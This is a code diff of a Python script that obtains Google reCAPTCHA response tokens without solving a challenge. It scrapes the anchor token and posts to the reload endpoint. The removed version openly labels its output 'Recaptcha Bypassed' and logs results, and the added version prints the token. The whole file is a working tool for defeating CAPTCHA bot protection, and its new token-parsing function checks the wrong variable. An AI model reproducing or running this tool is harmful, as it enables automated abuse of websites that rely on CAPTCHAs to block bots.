@@ -1,47 +1,51 @@
 import requests
 import json
-import urllib
-import time
+from bs4 import BeautifulSoup
 
-anchorr = str(input("Anchor URL : "))
-anchorr = anchorr.strip()
-keysite = anchorr.split('k=')[1].split("&")[0]
-var_co = anchorr.split("co=")[1].split("&")[0]
-var_v = anchorr.split("v=")[1].split("&")[0]
 
-r1 = requests.get(anchorr).text
+def getAnchorToken(source: str) -> str|None:
+    soup = BeautifulSoup(source, "html.parser")
+    rawToken = soup.find("input", id="recaptcha-token")
+    if rawInput is not None:
+        return rawToken["value"]
+    
 
-token1 = r1.split('recaptcha-token" value="')[1].split('">')[0]
+    return None
+def getReloadToken(rawResponse: str) -> str:
+    responseList: list = json.loads(rawResponse[5:])
 
-var_chr = str(input("CHR ([xx, xx, xx]) : "))
-var_vh = str(input("VH : "))
-var_bg = str(input("BG : "))
-var_chr = str(urllib.parse.quote(var_chr))
-print("\n\nBypassing Recaptcha...")
 
-payload = {
-    "v":var_v,
-    "reason":"q",
-    "c":token1,
-    "k":keysite,
-    "co":var_co,
-    "hl":"en",
-    "size":"invisible",
-    "chr":var_chr,
-    "vh":var_vh,
-    "bg":var_bg
-}
+    return responseList[1]    
 
-r2 = requests.post("https://www.google.com/recaptcha/api2/reload?k={}".format(keysite), data=payload)
-try:
-    token2 = str(r2.text.split('"rresp","')[1].split('"')[0])
-except:
-    token2 = 'null'
 
-if token2 == "null":
-    print("\nRecaptcha not vulnerable : \n\n"+str(r2.text))
-else:
-    print("\nRecaptcha Bypassed : \n\n"+str(token2))
-    with open("bypassed.txt", "a") as file:
-        file.write("RECAPTCHA BYPASSED\n\n\n\nAnchor : "+str(anchorr)+"\n\n\nReload : https://www.google.com/recaptcha/api2/reload?k="+str(keysite)+f"\n\nPayload : v={var_v}&reason=q&c=<token>&k={keysite}&co={var_co}&hl=en&size=invisible&chr={var_chr}&vh={var_vh}&bg={var_bg}")
-#v=()&reason=q&c=<token>&k=()&co=()&hl=en&size=invisible&chr=()&vh=()&bg=()
+if __name__ == "__main__":
+    APIs: dict = {
+        "anchor": "https://www.recaptcha.net/recaptcha/api2/anchor",
+        "reload": "https://www.recaptcha.net/recaptcha/api2/reload",
+    }
+    
+    
+    rawInput: str = str(input("Anchor URL: "))
+    assert rawInput.startswith(APIs["anchor"]), "Invalid Input"
+    
+    session = requests.session()
+    rawData: list = [i.split("=") for i in rawInput.split("?")[1].split("&")]
+    
+    anchorParams: dict = {item[0]:item[1] for item in rawData}
+    reloadParams: dict = {
+        "k": anchorParams["k"]
+    }
+    
+    
+    response = session.get(APIs["anchor"], params=anchorParams)
+    token: str = getAnchorToken(response.text)
+    
+    reloadData: dict = {
+        "c": token,
+        "reason": "q"
+    }
+    
+    response = session.post(APIs["reload"], params=reloadParams, data=reloadData)
+    token: str = getReloadToken(response.text)
+    
+    print(token)
